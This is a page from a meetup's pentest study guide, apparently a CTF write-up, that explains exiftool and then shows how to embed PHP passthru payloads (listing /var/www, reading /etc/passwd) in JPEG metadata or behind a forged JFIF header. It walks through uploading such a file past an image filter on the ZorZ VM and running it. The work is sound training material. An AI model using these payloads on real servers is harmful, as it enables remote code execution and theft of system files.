

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>8.4. exiftool &mdash; South Bay WASP 1.0.2 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
        <link rel="up" title="8. Pentest Study" href="../pentest_study.html"/>
        <link rel="next" title="8.5. loadlibrary" href="loadlibrary.html"/>
        <link rel="prev" title="8.3. Exfiltration" href="exfiltration.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="2factor.html">8.1. 2 Factor Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="email_security.html">8.2. Email Security</a></li>
<li class="toctree-l2"><a class="reference internal" href="exfiltration.html">8.3. Exfiltration</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">8.4. <strong class="program">exiftool</strong></a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id1">8.4.1. <strong class="program">exiftool</strong></a><ul>
<li class="toctree-l4"><a class="reference internal" href="#the-tool">8.4.1.1. The tool</a></li>
<li class="toctree-l4"><a class="reference internal" href="#file-metadata-and-tags">8.4.1.2. File metadata and tags</a></li>
<li class="toctree-l4"><a class="reference internal" href="#manipulating-tags">8.4.1.3. Manipulating tags</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#exploiting-metadata">8.4.2. Exploiting metadata</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#idea-behind-the-exploits">8.4.2.1. Idea behind the exploits</a></li>
<li class="toctree-l4"><a class="reference internal" href="#zorz-a-challenge-using-tags">8.4.2.2. ZorZ - a challenge using tags</a></li>
<li class="toctree-l4"><a class="reference internal" href="#natas13-only-first-11-bytes-are-jpeg">8.4.2.3. Natas13 - only first 11 bytes are JPEG</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="loadlibrary.html">8.5. loadlibrary</a></li>
<li class="toctree-l2"><a class="reference internal" href="linux_exploitation_tricks.html">8.6. Linux Exploitation Tricks</a></li>
<li class="toctree-l2"><a class="reference internal" href="llmnr.html">8.7. Windows broadcast name resolution</a></li>
<li class="toctree-l2"><a class="reference internal" href="ntlm.html">8.8. NTLM</a></li>
<li class="toctree-l2"><a class="reference internal" href="passwords.html">8.9. Password Cracking Resources</a></li>
<li class="toctree-l2"><a class="reference internal" href="php.html">8.10. PHP &amp; MySQL Shortcomings</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnerabilities.html">8.11. Vulnerabilites</a></li>
<li class="toctree-l2"><a class="reference internal" href="wifi.html">8.12. WiFi Tutorial</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_study.html">8. Pentest Study</a> &raquo;</li>
        
      <li>8.4. <strong class="program">exiftool</strong></li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/study/exiftool.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="exiftool">
<h1>8.4. <strong class="program">exiftool</strong><a class="headerlink" href="#exiftool" title="Permalink to this headline">¶</a></h1>
<div class="section" id="id1">
<h2>8.4.1. <strong class="program">exiftool</strong><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h2>
<div class="section" id="the-tool">
<h3>8.4.1.1. The tool<a class="headerlink" href="#the-tool" title="Permalink to this headline">¶</a></h3>
<p>From <a class="reference external" href="http://en.wikipedia.org/wiki/ExifTool">Wikipedia ExifTool</a>:</p>
<blockquote>
<div>ExifTool is a free software program for reading, writing, and manipulating image, audio, and video metadata. …  ExifTool is commonly incorporated into different types of digital workflows and supports many types of metadata including Exif, IPTC, XMP, JFIF, GeoTIFF, ICC Profile, Photoshop IRB, FlashPix, AFCP and ID3, as well as the manufacturer-specific metadata formats of many digital cameras. … The image hosting site Flickr uses ExifTool to parse the metadata from uploaded images.</div></blockquote>
<p>The official website is <a class="reference external" href="http://owl.phy.queensu.ca/~phil/exiftool/">ExifTool by Phil Harvey</a> lists the <a class="reference external" href="http://owl.phy.queensu.ca/~phil/exiftool/#supported">Supported File Types</a> and the <a class="reference external" href="http://owl.phy.queensu.ca/~phil/exiftool/#JPEG">Supported JPEG Meta Information</a>.</p>
<p>In Debian-based distributions it’s part of the libimage-exiftool-perl package:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nv">$SUDO</span> apt-get install apt-file -y
<span class="nv">$SUDO</span> apt-file update
<span class="hll">apt-file find bin/exiftool
</span></pre></div>
</div>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ SUDO=$</span><span class="o">(</span>which sudo<span class="o">)</span>
<span class="gp">hacker@kali:~$</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="gp">hacker@kali:~$ $</span>SUDO apt-get install apt-file -y
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~$ $</span>SUDO apt-file update
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="gp">hacker@kali:~$</span> apt-file find bin/exiftool
</span><span class="hll"><span class="go">libimage-exiftool-perl: /usr/bin/exiftool</span>
</span></pre></div>
</div>
</div>
<div class="section" id="file-metadata-and-tags">
<h3>8.4.1.2. File metadata and tags<a class="headerlink" href="#file-metadata-and-tags" title="Permalink to this headline">¶</a></h3>
<p>From <a class="reference external" href="http://owl.phy.queensu.ca/~phil/exiftool/#tagnamesf">Tag Names Explained</a>:</p>
<blockquote>
<div>A tag name is a “handle” that is used to refer to a specific piece of meta information. Tag names are entered on the command line with a leading ‘-‘, in the order you want them displayed. Case is not significant. The tag name may be prefixed by a group name from family 0 or 1 (separated by a colon) to identify a specific information type or location. A special tag name of “All” may be used to represent all tags, or all tags in a specified group. For example:</div></blockquote>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">JPEG</span><span class="o">=</span>trick.php.jpeg
</span>curl --silent --output <span class="nv">$JPEG</span> http://www.exiv2.org/include/img_1771.jpg
exiftool -filename -imagesize -exif:fnumber -xmp:all <span class="nv">$JPEG</span>
</pre></div>
</div>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">JPEG</span><span class="o">=</span>trick.php.jpeg
<span class="gp">hacker@kali:~$</span> curl --silent --output <span class="nv">$JPEG</span> http://www.exiv2.org/include/img_1771.jpg
<span class="hll"><span class="gp">hacker@kali:~$</span> exiftool -filename -imagesize -exif:fnumber -xmp:all <span class="nv">$JPEG</span>
</span><span class="hll"><span class="go">File Name                       : trick.php.jpeg</span>
</span><span class="hll"><span class="go">Image Size                      : 480x360</span>
</span><span class="hll"><span class="go">F Number                        : 4.9</span>
</span></pre></div>
</div>
<p>The complete list of recognized tags can be found at <a class="reference external" href="http://owl.phy.queensu.ca/~phil/exiftool/TagNames/index.html">ExifTool Tag Names</a>. For our sample image the list of all tags can be gotten from:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">exiftool -all <span class="nv">$JPEG</span>
</span></pre></div>
</div>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$</span> exiftool -all <span class="nv">$JPEG</span>
</span><span class="go">ExifTool Version Number         : 8.60</span>
<span class="go">File Name                       : trick.php.jpeg</span>
<span class="go">Directory                       : .</span>
<span class="go">File Size                       : 32 kB</span>
<span class="go">File Modification Date/Time     : 2015:05:06 11:03:46-07:00</span>
<span class="go">File Permissions                : rw-r--r--</span>
<span class="go">File Type                       : JPEG</span>
<span class="go">MIME Type                       : image/jpeg</span>
<span class="go">JFIF Version                    : 1.01</span>
<span class="go">Exif Byte Order                 : Little-endian (Intel, II)</span>
<span class="go">Make                            : Canon</span>
<span class="go">Camera Model Name               : Canon PowerShot S40</span>
<span class="go">Orientation                     : Horizontal (normal)</span>
<span class="go">X Resolution                    : 180</span>
<span class="go">Y Resolution                    : 180</span>
<span class="go">Resolution Unit                 : inches</span>
<span class="go">Modify Date                     : 2003:12:14 12:01:44</span>
<span class="go">Y Cb Cr Positioning             : Centered</span>
<span class="go">Exposure Time                   : 1/500</span>
<span class="go">F Number                        : 4.9</span>
<span class="go">Exif Version                    : 0220</span>
<span class="go">Date/Time Original              : 2003:12:14 12:01:44</span>
<span class="go">Create Date                     : 2003:12:14 12:01:44</span>
<span class="go">Components Configuration        : Y, Cb, Cr, -</span>
<span class="go">Compressed Bits Per Pixel       : 5</span>
<span class="go">Shutter Speed Value             : 1/501</span>
<span class="go">Aperture Value                  : 5.0</span>
<span class="go">Max Aperture Value              : 2.8</span>
<span class="go">Flash                           : Auto, Did not fire</span>
<span class="go">Focal Length                    : 21.3 mm</span>
<span class="go">Macro Mode                      : Normal</span>
<span class="go">Self Timer                      : Off</span>
<span class="go">Quality                         : Superfine</span>
<span class="go">Canon Flash Mode                : Auto</span>
<span class="go">Continuous Drive                : Single</span>
<span class="go">Focus Mode                      : Single</span>
<span class="go">Record Mode                     : JPEG</span>
<span class="go">Canon Image Size                : Large</span>
<span class="go">Easy Mode                       : Manual</span>
<span class="go">Digital Zoom                    : None</span>
<span class="go">Contrast                        : Normal</span>
<span class="go">Saturation                      : Normal</span>
<span class="go">Sharpness                       : 0</span>
<span class="go">Camera ISO                      : 100</span>
<span class="go">Metering Mode                   : Center-weighted average</span>
<span class="go">Focus Range                     : Auto</span>
<span class="go">AF Point                        : Center</span>
<span class="go">Canon Exposure Mode             : Program AE</span>
<span class="go">Lens Type                       : Unknown (-1)</span>
<span class="go">Long Focal                      : 21.3125 mm</span>
<span class="go">Short Focal                     : 7.09375 mm</span>
<span class="go">Focal Units                     : 32/mm</span>
<span class="go">Max Aperture                    : 5</span>
<span class="go">Min Aperture                    : 8</span>
<span class="go">Flash Activity                  : 0</span>
<span class="go">Flash Bits                      : (none)</span>
<span class="go">Focus Continuous                : Single</span>
<span class="go">AE Setting                      : Normal AE</span>
<span class="go">Display Aperture                : 4.9</span>
<span class="go">Zoom Source Width               : 2272</span>
<span class="go">Zoom Target Width               : 2272</span>
<span class="go">Spot Metering Mode              : AF Point</span>
<span class="go">Focal Type                      : Zoom</span>
<span class="go">Focal Plane X Size              : 7.26 mm</span>
<span class="go">Focal Plane Y Size              : 5.46 mm</span>
<span class="go">Auto ISO                        : 100</span>
<span class="go">Base ISO                        : 100</span>
<span class="go">Measured EV                     : 13.62</span>
<span class="go">Target Aperture                 : 5</span>
<span class="go">Target Exposure Time            : 1/501</span>
<span class="go">Exposure Compensation           : 0</span>
<span class="go">White Balance                   : Auto</span>
<span class="go">Slow Shutter                    : Off</span>
<span class="go">Shot Number In Continuous Burst : 0</span>
<span class="go">Optical Zoom Code               : 6</span>
<span class="go">Flash Guide Number              : 0</span>
<span class="go">AF Points In Focus              : Center</span>
<span class="go">Flash Exposure Compensation     : 0</span>
<span class="go">Auto Exposure Bracketing        : Off</span>
<span class="go">AEB Bracket Value               : 0</span>
<span class="go">Control Mode                    : Camera Local Control</span>
<span class="go">Focus Distance Upper            : 7.82 m</span>
<span class="go">Focus Distance Lower            : 0 m</span>
<span class="go">Bulb Duration                   : 0</span>
<span class="go">Camera Type                     : Compact</span>
<span class="go">Canon Image Type                : IMG:PowerShot S40 JPEG</span>
<span class="go">Canon Firmware Version          : Firmware Version 1.10</span>
<span class="go">File Number                     : 117-1771</span>
<span class="go">Owner Name                      : Andreas Huggel</span>
<span class="go">Canon Model ID                  : PowerShot S40</span>
<span class="go">User Comment                    :</span>
<span class="go">Flashpix Version                : 0100</span>
<span class="go">Color Space                     : sRGB</span>
<span class="go">Exif Image Width                : 2272</span>
<span class="go">Exif Image Height               : 1704</span>
<span class="go">Interoperability Index          : R98 - DCF basic file (sRGB)</span>
<span class="go">Interoperability Version        : 0100</span>
<span class="go">Related Image Width             : 2272</span>
<span class="go">Related Image Height            : 1704</span>
<span class="go">Focal Plane X Resolution        : 8114.285714</span>
<span class="go">Focal Plane Y Resolution        : 8114.285714</span>
<span class="go">Focal Plane Resolution Unit     : inches</span>
<span class="go">Sensing Method                  : One-chip color area</span>
<span class="go">File Source                     : Digital Camera</span>
<span class="go">Custom Rendered                 : Normal</span>
<span class="go">Exposure Mode                   : Auto</span>
<span class="go">Digital Zoom Ratio              : 1</span>
<span class="go">Scene Capture Type              : Standard</span>
<span class="go">Compression                     : JPEG (old-style)</span>
<span class="go">Thumbnail Offset                : 2066</span>
<span class="go">Thumbnail Length                : 5448</span>
<span class="go">Image Width                     : 480</span>
<span class="go">Image Height                    : 360</span>
<span class="go">Encoding Process                : Baseline DCT, Huffman coding</span>
<span class="go">Bits Per Sample                 : 8</span>
<span class="go">Color Components                : 3</span>
<span class="go">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span>
<span class="go">Aperture                        : 4.9</span>
<span class="go">Drive Mode                      : Single-frame Shooting</span>
<span class="go">ISO                             : 100</span>
<span class="go">Image Size                      : 480x360</span>
<span class="go">Lens                            : 7.1 - 21.3 mm</span>
<span class="go">Lens ID                         : Unknown 7-21mm</span>
<span class="go">Scale Factor To 35 mm Equivalent: 4.8</span>
<span class="go">Shooting Mode                   : Program AE</span>
<span class="go">Shutter Speed                   : 1/500</span>
<span class="go">Thumbnail Image                 : (Binary data 5448 bytes, use -b option to extract)</span>
<span class="go">Circle Of Confusion             : 0.006 mm</span>
<span class="go">Field Of View                   : 20.1 deg</span>
<span class="go">Focal Length                    : 21.3 mm (35 mm equivalent: 101.5 mm)</span>
<span class="go">Hyperfocal Distance             : 14.69 m</span>
<span class="go">Lens                            : 7.1 - 21.3 mm (35 mm equivalent: 33.8 - 101.5 mm)</span>
<span class="go">Light Value                     : 13.6</span>
</pre></div>
</div>
</div>
<div class="section" id="manipulating-tags">
<h3>8.4.1.3. Manipulating tags<a class="headerlink" href="#manipulating-tags" title="Permalink to this headline">¶</a></h3>
<p>Notice that tag “DocumentName” is not in $JPEG but we can set it to a php script:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># no DocumentName tag</span>
<span class="hll">exiftool -DocumentName <span class="nv">$JPEG</span>
</span><span class="c1"># now set DocumentName tag</span>
<span class="hll">exiftool -DocumentName<span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;ls -laR /var/www&quot;); ?&gt;&#39;</span> <span class="nv">$JPEG</span>
</span><span class="hll">exiftool -DocumentName <span class="nv">$JPEG</span>
</span><span class="c1"># original copy saved</span>
<span class="hll">ls <span class="si">${</span><span class="nv">JPEG</span><span class="si">}</span>*
</span></pre></div>
</div>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ #</span> no DocumentName tag
<span class="hll"><span class="gp">hacker@kali:~$</span> exiftool -DocumentName <span class="nv">$JPEG</span>
</span><span class="gp">hacker@kali:~$ #</span> now <span class="nb">set</span> DocumentName tag
<span class="hll"><span class="gp">hacker@kali:~$</span> exiftool -DocumentName<span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;ls -laR /var/www&quot;); ?&gt;&#39;</span> <span class="nv">$JPEG</span>
</span><span class="go">    1 image files updated</span>
<span class="hll"><span class="gp">hacker@kali:~$</span> exiftool -DocumentName <span class="nv">$JPEG</span>
</span><span class="hll"><span class="go">Document Name                   : &lt;?php passthru(&quot;ls -laR /var/www&quot;); ?&gt;</span>
</span><span class="gp">hacker@kali:~$ #</span> original copy saved
<span class="hll"><span class="gp">hacker@kali:~$ ls $</span><span class="o">{</span>JPEG<span class="o">}</span>*
</span><span class="hll"><span class="go">trick.php.jpeg  trick.php.jpeg_original</span>
</span></pre></div>
</div>
<p>Where in the $JPEG file can we find the tag DocumentName? Here’s a few looks at it showing it’s near the beginning of the file:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">strings <span class="nv">$JPEG</span> <span class="p">|</span> sed -e <span class="s1">&#39;/Canon/q&#39;</span>
</span><span class="hll">od -c <span class="nv">$JPEG</span> <span class="p">|</span> sed -e <span class="s1">&#39;/C   a   n/q&#39;</span>
</span></pre></div>
</div>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$ strings $</span>JPEG <span class="p">|</span> sed -e <span class="s1">&#39;/Canon/q&#39;</span>
</span><span class="hll"><span class="go">JFIF</span>
</span><span class="hll"><span class="go">Exif</span>
</span><span class="hll"><span class="go">&lt;?php passthru(&quot;ls -laR /var/www&quot;); ?&gt;</span>
</span><span class="hll"><span class="go">Canon</span>
</span><span class="hll"><span class="gp">hacker@kali:~$</span> od -c <span class="nv">$JPEG</span> <span class="p">|</span> sed -e <span class="s1">&#39;/C   a   n/q&#39;</span>
</span><span class="go">0000000 377 330 377 340  \0 020   J   F   I   F  \0 001 001 001  \0   H</span>
<span class="go">0000020  \0   H  \0  \0 377 341 033 234   E   x   i   f  \0  \0   I   I</span>
<span class="go">0000040   *  \0  \b  \0  \0  \0  \n  \0  \r 001 002  \0   &#39;  \0  \0  \0</span>
<span class="go">0000060 206  \0  \0  \0 017 001 002  \0 006  \0  \0  \0 256  \0  \0  \0</span>
<span class="go">0000100 020 001 002  \0 024  \0  \0  \0 264  \0  \0  \0 022 001 003  \0</span>
<span class="go">0000120 001  \0  \0  \0 001  \0  \0  \0 032 001 005  \0 001  \0  \0  \0</span>
<span class="go">0000140 310  \0  \0  \0 033 001 005  \0 001  \0  \0  \0 320  \0  \0  \0</span>
<span class="go">0000160   ( 001 003  \0 001  \0  \0  \0 002  \0  \0  \0   2 001 002  \0</span>
<span class="go">0000200 024  \0  \0  \0 330  \0  \0  \0 023 002 003  \0 001  \0  \0  \0</span>
<span class="go">0000220 001  \0  \0  \0   i 207 004  \0 001  \0  \0  \0 354  \0  \0  \0</span>
<span class="hll"><span class="go">0000240 356 005  \0  \0   &lt;   ?   p   h   p       p   a   s   s   t   h</span>
</span><span class="hll"><span class="go">0000260   r   u   (   &quot;   l   s       -   l   a   R       /   v   a   r</span>
</span><span class="hll"><span class="go">0000300   /   w   w   w   &quot;   )   ;       ?   &gt;  \0  \0   C   a   n   o</span>
</span></pre></div>
</div>
<p>The JFIF (<a class="reference external" href="http://www.w3.org/Graphics/JPEG/jfif3.pdf">JPEG File Interchange Format</a>) clearly states:</p>
<blockquote>
<div>you can identify a JFIF file by looking for the following sequence: X’FF’, SOI, X’FF’, APP0, &lt;2 bytes to be skipped&gt;, “JFIF”, X‘00’</div></blockquote>
<p>Following this recipe:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># JPEG leading 11 bytes: \xFF + SOI + \xFF + APP0 + \x00 + \x10 + &quot;JFIF&quot; + \x00</span>
</span><span class="hll"><span class="nv">JFIF_HEADER</span><span class="o">=</span><span class="s2">&quot;\xFF\xD8\xFF\xE0\x00\x10JFIF\x00&quot;</span>
</span><span class="hll"><span class="nv">EXPLOIT</span><span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;cat /etc/passwd&quot;); ?&gt;&#39;</span>
</span><span class="hll"><span class="nb">echo</span> -e <span class="s2">&quot;</span><span class="nv">$JFIF_HEADER$EXPLOIT</span><span class="s2">&quot;</span> &gt; exploit.php.jpeg
</span></pre></div>
</div>
</div>
</div>
<div class="section" id="exploiting-metadata">
<h2>8.4.2. Exploiting metadata<a class="headerlink" href="#exploiting-metadata" title="Permalink to this headline">¶</a></h2>
<div class="section" id="idea-behind-the-exploits">
<h3>8.4.2.1. Idea behind the exploits<a class="headerlink" href="#idea-behind-the-exploits" title="Permalink to this headline">¶</a></h3>
<p>Exploits can be based on a web server knowingly extracting metadata and trying to display the information. Consult <a class="reference external" href="http://pen-testing.sans.org/blog/2014/12/04/cross-site-scripting-through-file-metedata">Finding Zero-Day XSS Vulns via Doc Metadata</a> for some examples of this. The idea is to set multiple tag fields to JavaScript exploits (perhaps the <a class="reference external" href="http://beefproject.com/">BeEF</a> hook) and uploading it to vulnerable web sites.</p>
<p>Another approach is to upload a file <code class="file docutils literal"><span class="pre">x.php.jpeg</span></code> with tag-based php scripts to a php-based site that only allows image files. Accessing <code class="file docutils literal"><span class="pre">x.php.jpeg</span></code> then causes the tag-based php to execute.</p>
</div>
<div class="section" id="zorz-a-challenge-using-tags">
<h3>8.4.2.2. ZorZ - a challenge using tags<a class="headerlink" href="#zorz-a-challenge-using-tags" title="Permalink to this headline">¶</a></h3>
<p>ZorZ involved 3 web pages allowing image file uploads. The first &amp; third were easy: just name a php exploit file <code class="file docutils literal"><span class="pre">x.php.jpeg</span></code> and the uploader saw the “.jpeg” extension and allowed it, while php saw the “x.php” and executed the file as a php script.</p>
<p>However the second upload page really seemed to want an image file. So we used <strong class="program">exiftool</strong> to add a DocumentName tag that was actually a php exploit script. Here goes the exploit code:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># need ZorZ VM IP here</span>
<span class="nv">IP</span><span class="o">=</span><span class="m">192</span>.168.1.100
<span class="nv">JPEG</span><span class="o">=</span>trick.php.jpeg
curl --silent --output <span class="nv">$JPEG</span>  http://www.exiv2.org/include/img_1771.jpg
exiftool -DocumentName<span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;ls -laR /var/www&quot;); ?&gt;&#39;</span> <span class="nv">$JPEG</span>
curl --silent <span class="se">\</span>
     --form <span class="nv">upfile</span><span class="o">=</span><span class="s2">&quot;@</span><span class="nv">$JPEG</span><span class="s2">&quot;</span> <span class="se">\</span>
     --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload Image&quot;</span> <span class="se">\</span>
     http://<span class="nv">$IP</span>/uploader2.php <span class="se">\</span>
  <span class="p">|</span> grep <span class="s1">&#39;Success!&#39;</span>
curl --silent http://<span class="nv">$IP</span>/uploads2/<span class="nv">$JPEG</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> strings <span class="p">|</span> sed /^Canon/q
</pre></div>
</div>
<p>Running it allowed us to run our directory listing which revealed the SECRETFILE:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ #</span> need ZorZ VM IP here
<span class="gp">hacker@kali:~$</span> <span class="nv">IP</span><span class="o">=</span><span class="m">192</span>.168.1.100
<span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nv">JPEG</span><span class="o">=</span>trick.php.jpeg
</span><span class="hll"><span class="gp">hacker@kali:~$</span> curl --silent --output <span class="nv">$JPEG</span>  http://www.exiv2.org/include/img_1771.jpg
</span><span class="hll"><span class="gp">hacker@kali:~$</span> exiftool -DocumentName<span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;ls -laR /var/www&quot;); ?&gt;&#39;</span> <span class="nv">$JPEG</span>
</span><span class="go">    1 image files updated</span>
<span class="hll"><span class="gp">hacker@kali:~$</span> curl --silent <span class="se">\</span>
</span><span class="hll">&gt;      --form <span class="nv">upfile</span><span class="o">=</span><span class="s2">&quot;@</span><span class="nv">$JPEG</span><span class="s2">&quot;</span> <span class="se">\</span>
</span><span class="hll">&gt;      --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload Image&quot;</span> <span class="se">\</span>
</span><span class="hll">&gt;      http://<span class="nv">$IP</span>/uploader2.php <span class="se">\</span>
</span><span class="hll">&gt;   <span class="p">|</span> grep <span class="s1">&#39;Success!&#39;</span>
</span><span class="go"> Success! image/jpeg.The file trick.php.jpeg has been uploaded.</span>
<span class="hll"><span class="gp">hacker@kali:~$</span> curl --silent http://<span class="nv">$IP</span>/uploads2/<span class="nv">$JPEG</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> strings <span class="p">|</span> sed /^Canon/q
</span><span class="go">JFIF</span>
<span class="go">Exif</span>
<span class="go">/var/www:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x  3 root root 4096 Feb 17 20:44 .</span>
<span class="go">drwxr-xr-x 12 root root 4096 Feb 17 20:44 ..</span>
<span class="go">drwxr-xr-x  7 root root 4096 Feb 18 22:40 html</span>
<span class="go">/var/www/html:</span>
<span class="go">total 48</span>
<span class="go">drwxr-xr-x 7 root     root     4096 Feb 18 22:40 .</span>
<span class="go">drwxr-xr-x 3 root     root     4096 Feb 17 20:44 ..</span>
<span class="go">-rwxr-xr-x 1 www-data www-data  367 Feb 18 20:54 index.html</span>
<span class="go">-rwxr-xr-x 1 root     root      457 Feb 18 22:30 index2.html</span>
<span class="go">drwxr-xr-x 2 root     root     4096 Feb 18 22:22 jQuery</span>
<span class="go">drwxr-xr-x 2 root     root     4096 Feb 18 22:45 l337saucel337</span>
<span class="go">-rw-r--r-- 1 root     root      398 Feb 18 20:20 uploader.php</span>
<span class="go">-rw-r--r-- 1 root     root     1410 Feb 18 20:50 uploader2.php</span>
<span class="go">-rwxr-xr-x 1 root     root     1980 Feb 18 16:40 uploader3.php</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 uploads1</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Apr 21 19:05 uploads2</span>
<span class="go">drwxr-xr-x 2 www-data root     4096 Feb 18 22:39 uploads3</span>
<span class="go">/var/www/html/jQuery:</span>
<span class="go">total 28</span>
<span class="go">drwxr-xr-x 2 root root 4096 Feb 18 22:22 .</span>
<span class="go">drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..</span>
<span class="go">-rw-r--r-- 1 root root  753 Aug  7  2009 delete.png</span>
<span class="go">-rw-r--r-- 1 root root  715 Feb 18 21:59 script.js</span>
<span class="go">-rw-r--r-- 1 root root 1714 Feb 18 22:00 style.css</span>
<span class="go">-rw-r--r-- 1 root root 1049 Feb 18 22:18 upload.php</span>
<span class="go">-rw-r--r-- 1 root root 1232 Feb 18 22:19 uploadphp.php</span>
<span class="go">/var/www/html/l337saucel337:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x 2 root root 4096 Feb 18 22:45 .</span>
<span class="go">drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..</span>
<span class="hll"><span class="go">-rw-r--r-- 1 root root  400 Feb 18 22:45 SECRETFILE</span>
</span><span class="go">/var/www/html/uploads1:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 .</span>
